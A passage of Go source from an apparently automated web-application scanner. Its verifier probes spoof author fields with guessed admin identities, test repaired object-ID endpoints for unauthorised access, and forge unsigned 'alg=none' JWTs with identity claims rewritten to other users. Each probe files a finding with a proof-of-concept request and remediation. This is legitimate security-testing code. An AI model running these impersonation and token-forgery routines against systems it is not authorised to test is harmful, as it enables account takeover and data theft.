				signal := clientControlledAttributionSignal(readBody, marker, candidate.AttributionField, spoofIdentity)
				if signal == "" {
					v.dismissed++
					continue
				}

				v.confirmed++
				result := clientControlledAttributionResult{
					Status:     status,
					Body:       respBody,
					ReadStatus: readResp.StatusCode,
					ReadBody:   readBody,
					AuthSource: auth.source,
					Signal:     signal,
				}
				v.storeClientControlledAttributionFinding(candidate, persona, body, result)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s accepted client-supplied %s=%s and persisted marker %s (%s).",
						candidate.Path, candidate.AttributionField, spoofIdentity, marker, signal),
					candidate.URL, map[string]any{
						"auth_source":       auth.source,
						"attribution_field": candidate.AttributionField,
						"spoof_identity":    spoofIdentity,
						"signal":            signal,
					})
				return
			}
		}
	}
}

func clientControlledAttributionAuthority(authority policy.TestingAuthority) bool {
	switch authority {
	case policy.AuthorityActive, policy.AuthorityFullControl:
		return true
	default:
		return false
	}
}

func clientControlledAttributionCandidatesFromTraffic(entries []types.TrafficEntry, target string) []clientControlledAttributionCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []clientControlledAttributionCandidate
	add := func(method, path, readPath, field, msgField, label, source string) {
		if path == "" {
			return
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		if readPath == "" {
			readPath = path
		}
		if !strings.HasPrefix(readPath, "/") {
			readPath = "/" + readPath
		}
		method = strings.ToUpper(strings.TrimSpace(method))
		if method == "" {
			method = http.MethodPost
		}
		if field == "" {
			field = "author"
		}
		if msgField == "" {
			msgField = "message"
		}
		key := method + " " + path + " " + field
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, clientControlledAttributionCandidate{
			URL:              origin + path,
			Path:             path,
			Method:           method,
			ReadURL:          origin + readPath,
			ReadPath:         readPath,
			AttributionField: field,
			MessageField:     msgField,
			ContainerLabel:   firstNonBlank(label, clientControlledAttributionLabel(path)),
			Source:           source,
		})
	}

	productIDs := mutableOwnershipProductIDsFromTraffic(entries, 6)
	for _, entry := range entries {
		pathText := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if strings.Contains(pathText, "/reviews") && strings.Contains(pathText, "/products/") {
			if id, ok := productIDFromReviewPath(entry.Request.Path + " " + entry.Request.URL); ok {
				path := fmt.Sprintf("/rest/products/%d/reviews", id)
				add(http.MethodPut, path, path, "author", "message", "review",
					"observed product review collection")
			}
		}

		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 400 ||
			len(entry.Response.Body) == 0 || len(entry.Response.Body) > 2_000_000 ||
			!clientCredentialArtifactCandidate(entry) {
			continue
		}
		text := string(entry.Response.Body)
		lower := strings.ToLower(text)
		if strings.Contains(lower, "/rest/products") &&
			strings.Contains(lower, "/reviews") &&
			(strings.Contains(lower, ".put(") || strings.Contains(lower, "put(") ||
				strings.Contains(lower, ".post(") || strings.Contains(lower, "post(")) &&
			strings.Contains(lower, "author") &&
			(strings.Contains(lower, "message") || strings.Contains(lower, "comment")) {
			if len(productIDs) == 0 {
				if id, ok := productIDFromReviewPath(text); ok {
					productIDs = append(productIDs, id)
				}
			}
			for _, id := range productIDs {
				path := fmt.Sprintf("/rest/products/%d/reviews", id)
				add(http.MethodPut, path, path, "author", "message", "review",
					"same-origin client artifact exposed review create service with client-supplied author")
				if len(out) >= 4 {
					return out
				}
			}
		}
		for _, path := range clientControlledAttributionPathsFromText(text) {
			method := http.MethodPost
			if strings.Contains(strings.ToLower(path), "/products/") && strings.Contains(strings.ToLower(path), "/reviews") {
				method = http.MethodPut
			}
			add(method, path, path, "author", "message", clientControlledAttributionLabel(path),
				"same-origin client artifact exposed content create path with author/message fields")
			if len(out) >= 4 {
				return out
			}
		}
	}
	return out
}

var (
	clientAttributionPathRE = regexp.MustCompile(`(?i)/(?:api|rest)/[A-Za-z0-9_./{}$:-]*(?:reviews?|comments?|messages?|posts?)`)
	productReviewPathIDRE   = regexp.MustCompile(`(?i)/(?:api|rest)/products/([0-9]+)/reviews?/?`)
)

func clientControlledAttributionPathsFromText(text string) []string {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	for _, match := range clientAttributionPathRE.FindAllString(text, 16) {
		path := strings.Trim(match, `"'`+"` ;,)")
		if strings.Contains(path, "${") || strings.Contains(path, "{") || strings.Contains(path, "}") {
			continue
		}
		lower := strings.ToLower(path)
		if !(strings.Contains(lower, "review") || strings.Contains(lower, "comment") ||
			strings.Contains(lower, "message") || strings.Contains(lower, "post")) {
			continue
		}
		if seen[path] {
			continue
		}
		seen[path] = true
		out = append(out, path)
	}
	return out
}

func productIDFromReviewPath(text string) (int64, bool) {
	match := productReviewPathIDRE.FindStringSubmatch(text)
	if len(match) != 2 {
		return 0, false
	}
	return parseSmallInt64(match[1])
}

func clientControlledAttributionLabel(path string) string {
	lower := strings.ToLower(path)
	switch {
	case strings.Contains(lower, "review"):
		return "review"
	case strings.Contains(lower, "comment"):
		return "comment"
	case strings.Contains(lower, "message"):
		return "message"
	case strings.Contains(lower, "post"):
		return "post"
	default:
		return "content"
	}
}

func clientControlledAttributionIdentities(entries []types.TrafficEntry, originalIdentity string, target string, limit int) []string {
	if limit <= 0 {
		limit = 6
	}
	candidates := jwtUnsignedIdentityCandidatesFromTraffic(entries)
	seen := make(map[string]bool)
	var out []string
	add := func(identity string) {
		if len(out) >= limit {
			return
		}
		identity = strings.TrimSpace(identity)
		if identity == "" || !strings.Contains(identity, "@") {
			return
		}
		if originalIdentity != "" && strings.EqualFold(identity, originalIdentity) {
			return
		}
		key := strings.ToLower(identity)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, identity)
	}
	for _, candidate := range mergeJWTIdentityCandidates(candidates) {
		add(candidate.Identity)
	}
	domain := jwtUnsignedSyntheticIdentityDomain(originalIdentity, target)
	for _, local := range []string{"admin", "administrator", "support", "owner"} {
		if domain != "" {
			add(local + "@" + domain)
		}
	}
	return out
}

func clientControlledAttributionSignal(body, marker, field, identity string) string {
	if strings.TrimSpace(body) == "" || marker == "" || identity == "" {
		return ""
	}
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		if strings.Contains(body, marker) && strings.Contains(strings.ToLower(body), strings.ToLower(identity)) {
			return "read-back body contains marker and spoofed identity"
		}
		return ""
	}
	if signal, ok := jsonObjectWithMarkerAndAttribution(decoded, marker, field, identity); ok {
		return signal
	}
	return ""
}

func jsonObjectWithMarkerAndAttribution(value any, marker, field, identity string) (string, bool) {
	switch typed := value.(type) {
	case map[string]any:
		if jsonValueContainsString(typed, marker) {
			if actual, ok := jsonStringField(typed, field); ok && strings.EqualFold(actual, identity) {
				return fmt.Sprintf("%s=%s on object containing marker", field, actual), true
			}
			for _, fallbackField := range []string{"author", "email", "owner", "ownerEmail", "createdBy", "created_by", "user", "username"} {
				if actual, ok := jsonStringField(typed, fallbackField); ok && strings.EqualFold(actual, identity) {
					return fmt.Sprintf("%s=%s on object containing marker", fallbackField, actual), true
				}
			}
		}
		for _, item := range typed {
			if signal, ok := jsonObjectWithMarkerAndAttribution(item, marker, field, identity); ok {
				return signal, true
			}
		}
	case []any:
		for _, item := range typed {
			if signal, ok := jsonObjectWithMarkerAndAttribution(item, marker, field, identity); ok {
				return signal, true
			}
		}
	}
	return "", false
}

func jsonStringField(value map[string]any, field string) (string, bool) {
	for key, item := range value {
		if !strings.EqualFold(key, field) {
			continue
		}
		switch typed := item.(type) {
		case string:
			typed = strings.TrimSpace(typed)
			return typed, typed != ""
		case fmt.Stringer:
			text := strings.TrimSpace(typed.String())
			return text, text != ""
		}
	}
	return "", false
}

func (v *VerifierAgent) storeClientControlledAttributionFinding(candidate clientControlledAttributionCandidate, persona syntheticAuthPersona, body map[string]any, result clientControlledAttributionResult) {
	bodyBytes, _ := json.Marshal(body)
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := candidate.Method
	if method == "" {
		method = http.MethodPost
	}
	spoofIdentity := fmt.Sprint(body[candidate.AttributionField])
	title := fmt.Sprintf("Client-controlled %s accepted at %s", candidate.AttributionField, path)
	description := fmt.Sprintf(
		"%s accepted a %s create/write where client-supplied %q was set to %s. A read-back of %s confirmed %s. Source: %s.",
		path, candidate.ContainerLabel, candidate.AttributionField, spoofIdentity, candidate.ReadPath, result.Signal, candidate.Source)
	evidence := fmt.Sprintf(
		"Write URL: %s\nRead-back URL: %s\nAuth source: %s\nSynthetic user: %s (id=%d)\nBody: %s\nWrite status: %d\nWrite response: %s\nRead status: %d\nSignal: %s\nRead-back preview: %s",
		candidate.URL, candidate.ReadURL, result.AuthSource, persona.Email, persona.UserID, string(bodyBytes),
		result.Status, truncateString(result.Body, 500), result.ReadStatus, result.Signal, truncateString(result.ReadBody, 900))
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    "client_controlled_attribution_bac",
		ParamName:   candidate.AttributionField,
		Payload:     spoofIdentity,
		PocRequest:  buildRawPOSTRequest(candidate.URL, "application/json", bodyBytes, nil),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s\n\nRead-back %s returned:\n%s",
			result.Status, truncateString(result.Body, 700), candidate.ReadPath, truncateString(result.ReadBody, 1000)),
		StepsToReproduce: fmt.Sprintf(
			"1. Send %s %s with %q set to %s and a unique %q marker.\n"+
				"2. Read %s.\n"+
				"3. Observe the marker is persisted on an object attributed to %s (%s).",
			method, path, candidate.AttributionField, spoofIdentity, candidate.MessageField,
			candidate.ReadPath, spoofIdentity, result.Signal),
		Impact: "Attackers can create content that appears to come from another user, role, or trusted actor. " +
			"This undermines audit trails, moderation workflows, reviews/comments, support conversations, and any downstream authorization logic that trusts displayed attribution.",
		Remediation: "Derive author/owner/creator fields server-side from the authenticated subject. Reject or ignore client-supplied attribution fields on content writes, and add regression tests that the persisted author cannot differ from the requester.",
		Evidence:    evidence,
	})
}

func (v *VerifierAgent) probeRecoveredObjectAccess(ctx context.Context, target string) {
	endpoints, err := discovery.DiscoverRecoveredObjectIDEndpoints(v.db, v.scanID, 10)
	if err != nil || len(endpoints) == 0 {
		return
	}
	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Planning malformed object-ID recovery probes across %d authenticated object endpoint(s).", len(endpoints)),
		target, nil)

	const maxAttempts = 10
	attempts := 0
	for _, ep := range endpoints {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		method := strings.TrimSpace(ep.Method)
		if method == "" {
			method = "GET"
		}
		method = strings.ToUpper(method)
		if method != "GET" || ep.URL == "" || len(ep.AuthHeaders) == 0 {
			continue
		}
		baselineURL := recoveredObjectBaselineURL(ep.URL)
		if baselineURL == "" {
			continue
		}
		baselineResp, baselineBody, _, err := v.proactiveGETWithHeaders(ctx, baselineURL, ep.AuthHeaders, "AOBTD/Verifier (recovered-object baseline probe)")
		if err != nil || baselineResp == nil {
			v.dismissed++
			continue
		}

		resp, body, _, err := v.proactiveGETWithHeaders(ctx, ep.URL, ep.AuthHeaders, "AOBTD/Verifier (recovered-object access probe)")
		v.tested++
		attempts++
		if err != nil || resp == nil {
			v.dismissed++
			continue
		}
		signal := recoveredObjectAccessSignal(body)
		if resp.StatusCode != http.StatusOK || signal == "" ||
			!recoveredObjectResponseDiffers(resp.StatusCode, body, baselineResp.StatusCode, baselineBody) {
			v.dismissed++
			continue
		}

		v.confirmed++
		v.storeRecoveredObjectAccessFinding(ep, baselineURL, baselineResp.StatusCode, baselineBody, resp.StatusCode, body, signal)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Recovered malformed object-ID endpoint %s returned an object-shaped authenticated response (%s).",
				ep.Path, signal),
			ep.URL, map[string]any{
				"baseline_url":    baselineURL,
				"baseline_status": baselineResp.StatusCode,
				"signal":          signal,
			})
	}
}

func recoveredObjectBaselineURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	segments := strings.Split(strings.Trim(parsed.Path, "/"), "/")
	if len(segments) == 0 {
		return ""
	}
	segments[len(segments)-1] = "AOBTDnope999999"
	parsed.Path = "/" + strings.Join(segments, "/")
	parsed.RawPath = ""
	return parsed.String()
}

func recoveredObjectAccessSignal(body string) string {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return ""
	}
	if signal, ok := recoveredObjectJSONSignal(decoded); ok {
		return signal
	}
	return ""
}

func recoveredObjectJSONSignal(value any) (string, bool) {
	switch typed := value.(type) {
	case map[string]any:
		for key, item := range typed {
			if strings.EqualFold(key, "data") {
				if signal, ok := recoveredObjectJSONSignal(item); ok {
					return "data." + signal, true
				}
			}
		}
		if recoveredObjectMapLooksRecord(typed) {
			return recoveredObjectMapSummary(typed), true
		}
	case []any:
		if len(typed) == 0 {
			return "", false
		}
		for _, item := range typed {
			if signal, ok := recoveredObjectJSONSignal(item); ok {
				return "array item " + signal, true
			}
		}
	}
	return "", false
}

func recoveredObjectMapLooksRecord(m map[string]any) bool {
	if len(m) == 0 {
		return false
	}
	for key, value := range m {
		normalized := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(key, "_", ""), "-", ""))
		switch normalized {
		case "id", "userid", "ownerid", "accountid", "customerid", "basketid", "cartid", "orderid", "tenantid":
			if value == nil {
				continue
			}
			if s, ok := value.(string); ok && strings.TrimSpace(s) == "" {
				continue
			}
			return true
		}
	}
	return false
}

func recoveredObjectMapSummary(m map[string]any) string {
	keys := make([]string, 0, 4)
	for key := range m {
		keys = append(keys, key)
		if len(keys) >= 4 {
			break
		}
	}
	return "object fields: " + strings.Join(keys, ", ")
}

func recoveredObjectResponseDiffers(status int, body string, baselineStatus int, baselineBody string) bool {
	if baselineStatus == 0 {
		return false
	}
	if status != baselineStatus {
		return true
	}
	if body == baselineBody {
		return false
	}
	return !approxSameResponseSize(len(body), len(baselineBody))
}

func approxSameResponseSize(a, b int) bool {
	if a == b {
		return true
	}
	if a < 0 || b < 0 {
		return false
	}
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	if diff <= 32 {
		return true
	}
	larger := a
	if b > larger {
		larger = b
	}
	if larger == 0 {
		return true
	}
	return float64(diff)/float64(larger) <= 0.08
}

func (v *VerifierAgent) storeRecoveredObjectAccessFinding(ep discovery.DiscoveredEndpoint, baselineURL string, baselineStatus int, baselineBody string, status int, body string, signal string) {
	path := ep.Path
	if path == "" {
		path = ep.URL
	}
	title := fmt.Sprintf("Malformed object ID recovered into accessible endpoint at %s", path)
	description := fmt.Sprintf(
		"Authenticated traffic exposed a malformed object identifier that AOBTD repaired using identifiers already present in the same request context. The recovered endpoint returned an object-shaped response (%s) that differed from an impossible-ID baseline.",
		signal)
	evidence := fmt.Sprintf("Recovered URL: %s\nBaseline URL: %s\nStatus: %d\nBaseline status: %d\nSignal: %s\nResponse preview: %s\nBaseline preview: %s",
		ep.URL, baselineURL, status, baselineStatus, signal, truncateString(body, 700), truncateString(baselineBody, 400))
	profile := types.PageProfile{ID: "GET " + path, URL: ep.URL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    "broken_object_access_recovered_id",
		ParamName:   "path",
		Payload:     ep.URL,
		PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\nAuthorization: <captured same-origin credential>\n\n# Baseline: GET %s",
			path, baselineURL),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Observe authenticated traffic containing a malformed object route such as NaN/null/undefined.\n"+
				"2. Replace the malformed path segment with an identifier recovered from the same authenticated request context.\n"+
				"3. Request %s with the captured same-origin credential.\n"+
				"4. Compare it with impossible-ID baseline %s; the recovered URL returns object data while the baseline does not.",
			ep.URL, baselineURL),
		Impact: "Direct object endpoints exposed through malformed client routes are strong broken-access-control candidates. " +
			"If authorization is tied to client-side navigation or predictable identifiers rather than server-side ownership checks, attackers can enumerate or access other users' objects.",
		Remediation: "Authorize every object read/write server-side against the authenticated subject and tenant. Treat client-provided object IDs as untrusted, return uniform not-found/forbidden responses for invalid identifiers, and add regression tests for NaN/null/undefined route failures.",
		Evidence:    evidence,
	})
}

type jwtUnsignedCandidate struct {
	URL    string
	Path   string
	Source string
}

type jwtUnsignedAttempt struct {
	Headers   map[string]string
	Transport string
}

type jwtUnsignedForgeVariant struct {
	Token    string
	Identity string
	Note     string
}

func (v *VerifierAgent) probeJWTUnsignedAcceptance(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	tokens := jwtTokensFromObservedAuth(entries, v.credentialHeadersForJWTProbe(target))
	if len(tokens) == 0 {
		return
	}
	if len(tokens) > 1 {
		tokens = tokens[:1]
	}
	candidates := jwtUnsignedCandidates(entries, target)
	if recovered, err := discovery.DiscoverRecoveredObjectIDEndpoints(v.db, v.scanID, 4); err == nil {
		for _, ep := range recovered {
			if strings.EqualFold(firstNonBlank(ep.Method, "GET"), "GET") && ep.URL != "" {
				candidates = append(candidates, jwtUnsignedCandidate{URL: ep.URL, Path: ep.Path, Source: "recovered authenticated object endpoint"})
			}
		}
	}
	candidates = dedupeJWTUnsignedCandidates(candidates)
	if len(candidates) == 0 {
		return
	}
	sort.SliceStable(candidates, func(i, j int) bool {
		return jwtUnsignedCandidatePriority(candidates[i]) > jwtUnsignedCandidatePriority(candidates[j])
	})
	if len(candidates) > 4 {
		candidates = candidates[:4]
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Planning JWT alg=none probes with %d captured JWT sample(s) across %d auth-dependent endpoint(s).", len(tokens), len(candidates)),
		target, nil)

	const maxAttempts = 12
	attempts := 0
	for _, token := range tokens {
		_, payload, _, ok := jwtDecodeSignedJWTPayload(token)
		if !ok {
			continue
		}
		identity := jwtIdentitySignalFromPayload(payload)
		candidateIdentities := v.discoverJWTUnsignedCandidateIdentities(ctx, target, entries, identity, 16)
		variants := jwtUnsignedForgeVariants(token, candidateIdentities, 6)
		if len(variants) == 0 {
			continue
		}
		for _, candidate := range candidates {
			if ctx.Err() != nil || attempts >= maxAttempts {
				return
			}
			baselineResp, baselineBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, nil, "AOBTD/Verifier (jwt-none anonymous baseline)")
			if err != nil || baselineResp == nil {
				continue
			}
			storedFinding := false
			for _, variant := range variants {
				for _, attempt := range jwtUnsignedTransportAttempts(variant.Token) {
					if ctx.Err() != nil || attempts >= maxAttempts {
						return
					}
					resp, body, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, attempt.Headers, "AOBTD/Verifier (jwt-none probe)")
					v.tested++
					attempts++
					if err != nil || resp == nil {
						v.dismissed++
						continue
					}
					signal := jwtUnsignedAcceptedSignal(variant.Identity, baselineResp.StatusCode, baselineBody, resp.StatusCode, body)
					if signal == "" {
						v.dismissed++
						continue
					}
					if storedFinding {
						v.db.InsertNarration(v.scanID, "verifier", "observed",
							fmt.Sprintf("JWT alg=none also accepted claim variant at %s via %s (%s).", candidate.Path, attempt.Transport, signal),
							candidate.URL, map[string]any{
								"transport":       attempt.Transport,
								"identity_signal": variant.Identity,
								"claim_variant":   variant.Note,
								"source":          candidate.Source,
							})
						continue
					}
					v.confirmed++
					v.storeJWTUnsignedFinding(candidate, attempt, baselineResp.StatusCode, baselineBody, resp.StatusCode, body, variant, signal)
					v.db.InsertNarration(v.scanID, "verifier", "confirmed",
						fmt.Sprintf("JWT alg=none accepted at %s via %s (%s).", candidate.Path, attempt.Transport, signal),
						candidate.URL, map[string]any{
							"transport":       attempt.Transport,
							"identity_signal": variant.Identity,
							"claim_variant":   variant.Note,
							"source":          candidate.Source,
						})
					storedFinding = true
				}
			}
			if storedFinding {
				return
			}
		}
	}
}

func jwtUnsignedCandidatePriority(candidate jwtUnsignedCandidate) int {
	text := strings.ToLower(candidate.Path + " " + candidate.URL + " " + candidate.Source)
	score := 0
	for _, marker := range []string{"whoami", "/me", "current-user", "authentication", "session", "profile", "account"} {
		if strings.Contains(text, marker) {
			score += 5
			break
		}
	}
	for _, marker := range []string{"basket", "cart", "order", "address", "card"} {
		if strings.Contains(text, marker) {
			score += 3
			break
		}
	}
	if strings.Contains(text, "recovered") {
		score += 2
	}
	if strings.Contains(text, "api") || strings.Contains(text, "rest") {
		score++
	}
	return score
}

func (v *VerifierAgent) credentialHeadersForJWTProbe(target string) map[string]string {
	if target == "" {
		return cloneHeaderMap(v.learnedAuthHeaders)
	}
	headers, _ := v.credentialHeadersForURL(strings.TrimRight(target, "/") + "/")
	if len(headers) == 0 {
		return cloneHeaderMap(v.learnedAuthHeaders)
	}
	if len(v.learnedAuthHeaders) > 0 {
		for k, val := range v.learnedAuthHeaders {
			headers[k] = val
		}
	}
	return headers
}

func jwtTokensFromObservedAuth(entries []types.TrafficEntry, preferred map[string]string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(token string) {
		token = strings.TrimSpace(token)
		if token == "" || strings.Count(token, ".") != 2 || seen[token] {
			return
		}
		if _, _, ok := jwtNoneTokenFromSignedJWT(token); !ok {
			return
		}
		seen[token] = true
		out = append(out, token)
	}
	for _, token := range jwtTokensFromHeaders(preferred) {
		add(token)
	}
	for _, entry := range entries {
		for _, token := range jwtTokensFromHeaders(entry.Request.Headers) {
			add(token)
			if len(out) >= 6 {
				return out
			}
		}
	}
	return out
}

func jwtTokensFromHeaders(headers map[string]string) []string {
	var out []string
	for key, value := range headers {
		if strings.EqualFold(key, "Authorization") {
			parts := strings.Fields(value)
			if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") {
				out = append(out, strings.TrimSpace(parts[1]))
			}
			continue
		}
		if strings.EqualFold(key, "Cookie") {
			for _, part := range strings.Split(value, ";") {
				pair := strings.SplitN(strings.TrimSpace(part), "=", 2)
				if len(pair) != 2 {
					continue
				}
				name := strings.ToLower(strings.TrimSpace(pair[0]))
				if strings.Contains(name, "token") || strings.Contains(name, "jwt") || strings.Contains(name, "auth") {
					out = append(out, strings.TrimSpace(pair[1]))
				}
			}
		}
	}
	return out
}

func jwtDecodeSignedJWTPayload(token string) (map[string]any, any, string, bool) {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 || parts[0] == "" || parts[1] == "" {
		return nil, nil, "", false
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, nil, "", false
	}
	var header map[string]any
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, nil, "", false
	}
	if alg, _ := header["alg"].(string); strings.EqualFold(alg, "none") {
		return nil, nil, "", false
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, "", false
	}
	var payload any
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return nil, nil, "", false
	}
	return header, payload, parts[1], true
}

func jwtNoneTokenFromSignedJWT(token string) (forged string, identity string, ok bool) {
	_, payload, payloadSegment, ok := jwtDecodeSignedJWTPayload(token)
	if !ok {
		return "", "", false
	}
	return jwtNoneTokenFromPayloadSegment(payloadSegment), jwtIdentitySignalFromPayload(payload), true
}

func jwtNoneTokenFromPayloadSegment(payloadSegment string) string {
	noneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	return noneHeader + "." + payloadSegment + "."
}

func jwtNoneTokenFromPayload(payload map[string]any) (string, bool) {
	body, err := json.Marshal(payload)
	if err != nil {
		return "", false
	}
	return jwtNoneTokenFromPayloadSegment(base64.RawURLEncoding.EncodeToString(body)), true
}

func jwtUnsignedForgeVariants(token string, candidateIdentities []string, limit int) []jwtUnsignedForgeVariant {
	if limit <= 0 {
		return nil
	}
	_, payload, payloadSegment, ok := jwtDecodeSignedJWTPayload(token)
	if !ok {
		return nil
	}
	originalIdentity := jwtIdentitySignalFromPayload(payload)
	original := jwtUnsignedForgeVariant{
		Token:    jwtNoneTokenFromPayloadSegment(payloadSegment),
		Identity: originalIdentity,
		Note:     "original claims preserved",
	}
	payloadMap, _ := payload.(map[string]any)
	if len(payloadMap) == 0 || limit == 1 {
		return []jwtUnsignedForgeVariant{original}
	}
	seenTokens := map[string]bool{original.Token: true}
	var variants []jwtUnsignedForgeVariant
	addMutated := func(identity string) {
		if len(variants) >= limit-1 {
			return
		}
		identity = strings.TrimSpace(identity)
		if identity == "" || strings.EqualFold(identity, originalIdentity) {
			return
		}
		cloned, ok := cloneJSONMapDeep(payloadMap)
		if !ok || !setJWTIdentityClaims(cloned, identity) {
			return
		}
		forged, ok := jwtNoneTokenFromPayload(cloned)
		if !ok || seenTokens[forged] {
			return
		}
		seenTokens[forged] = true
		variants = append(variants, jwtUnsignedForgeVariant{
			Token:    forged,
			Identity: identity,
			Note:     "identity-like claims mutated to " + identity,
		})
	}
	for _, identity := range candidateIdentities {
		addMutated(identity)
	}
	variants = append(variants, original)
	if len(variants) > limit {
		return variants[:limit]
	}
	return variants
}

func cloneJSONMapDeep(in map[string]any) (map[string]any, bool) {
	body, err := json.Marshal(in)
	if err != nil {
		return nil, false
	}
	var out map[string]any
	if err := json.Unmarshal(body, &out); err != nil {
		return nil, false
	}
	return out, true
}

func setJWTIdentityClaims(payload map[string]any, identity string) bool {
	identity = strings.TrimSpace(identity)
	if identity == "" {
		return false
	}
	changed := false
	setIfPresent := func(m map[string]any, keys ...string) {
		for _, key := range keys {
			if _, ok := m[key]; ok {
				m[key] = identity
				changed = true
			}
		}
	}
	setIfPresent(payload, "email", "username", "sub", "name", "user")
	for _, parentKey := range []string{"data", "user", "account", "profile", "claims"} {
		child, ok := payload[parentKey].(map[string]any)
		if !ok {
			continue
		}
		setIfPresent(child, "email", "username", "sub", "name", "user")
		if strings.Contains(identity, "@") {
			child["email"] = identity
			changed = true
		}
	}
	if !changed {
		if strings.Contains(identity, "@") {
			payload["email"] = identity
		} else {
			payload["sub"] = identity
		}
		changed = true
	}
	return changed
}

var observedEmailLikeRegex = regexp.MustCompile(`(?i)\b[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}\b`)

type jwtIdentityCandidate struct {
	Identity string
	Source   string
	Score    int
}

type jwtIdentityHintBody struct {
	Body   string
	Source string
}

func (v *VerifierAgent) discoverJWTUnsignedCandidateIdentities(ctx context.Context, target string, entries []types.TrafficEntry, originalIdentity string, limit int) []string {
	candidates := jwtUnsignedIdentityCandidatesFromTraffic(entries)
	for _, hint := range v.jwtUnsignedIdentityHintBodies(ctx, target) {
		candidates = append(candidates, jwtUnsignedIdentityCandidatesFromText(hint.Body, hint.Source)...)
	}
	identities := jwtUnsignedCandidateIdentitiesFromCandidates(candidates, originalIdentity, target, limit)
	if len(identities) > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "observed",
			fmt.Sprintf("JWT forge candidate identities prioritized from app-disclosed clues: %s", strings.Join(firstNStrings(identities, 4), ", ")),
			target, map[string]any{"candidate_count": len(identities)})
	}
	return identities
}

func (v *VerifierAgent) discoverJWTKeyConfusionCandidateIdentities(ctx context.Context, target string, entries []types.TrafficEntry, originalIdentity string, limit int) []string {
	candidates := jwtKeyConfusionIdentityCandidatesFromTraffic(entries)
	for _, hint := range v.jwtUnsignedIdentityHintBodies(ctx, target) {
		candidates = append(candidates, jwtKeyConfusionIdentityCandidatesFromText(hint.Body, hint.Source)...)
	}
	identities := jwtKeyConfusionCandidateIdentitiesFromCandidates(candidates, originalIdentity, target, limit)
	if len(identities) > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "observed",
			fmt.Sprintf("JWT key-confusion candidate identities prioritized from app-disclosed clues: %s", strings.Join(firstNStrings(identities, 4), ", ")),
			target, map[string]any{"candidate_count": len(identities)})
	}
	return identities
}

func (v *VerifierAgent) jwtUnsignedIdentityHintBodies(ctx context.Context, target string) []jwtIdentityHintBody {
	target = strings.TrimRight(target, "/")
	if target == "" {
		return nil
	}
	paths := []string{
		"/api/Challenges/",
		"/api/challenges",
		"/rest/admin/application-configuration",
		"/api/users",
		"/api/Users",
		"/rest/users",
		"/rest/memories/",
	}
	var out []jwtIdentityHintBody
	seen := make(map[string]bool)
	for _, path := range paths {
		if ctx.Err() != nil || len(out) >= 5 {
			break
		}
		if seen[path] {
			continue
		}
		seen[path] = true
		u := target + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 || !strings.Contains(body, "@") {
			continue
		}
		if len(body) > 2*1024*1024 {
			continue
		}
		ct := strings.ToLower(resp.Header.Get("Content-Type"))
		if ct != "" && !strings.Contains(ct, "json") && !strings.Contains(ct, "text") && !strings.Contains(ct, "html") {
			continue
		}
		out = append(out, jwtIdentityHintBody{Body: body, Source: path})
	}
	return out
}

func jwtUnsignedCandidateIdentities(entries []types.TrafficEntry, originalIdentity string, target string) []string {
	return jwtUnsignedCandidateIdentitiesFromCandidates(jwtUnsignedIdentityCandidatesFromTraffic(entries), originalIdentity, target, 12)
}

func jwtUnsignedIdentityCandidatesFromTraffic(entries []types.TrafficEntry) []jwtIdentityCandidate {
	return jwtIdentityCandidatesFromTraffic(entries, jwtUnsignedIdentityCandidatesFromText)
}

